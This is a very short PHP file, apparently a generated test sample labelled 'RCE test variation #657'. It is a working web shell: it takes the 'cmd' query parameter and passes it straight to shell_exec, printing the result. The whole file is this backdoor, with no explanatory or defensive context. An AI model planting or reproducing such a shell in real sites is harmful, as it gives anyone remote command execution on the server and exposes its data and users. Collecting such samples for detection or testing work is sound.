<?php
// RCE test variation #657
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>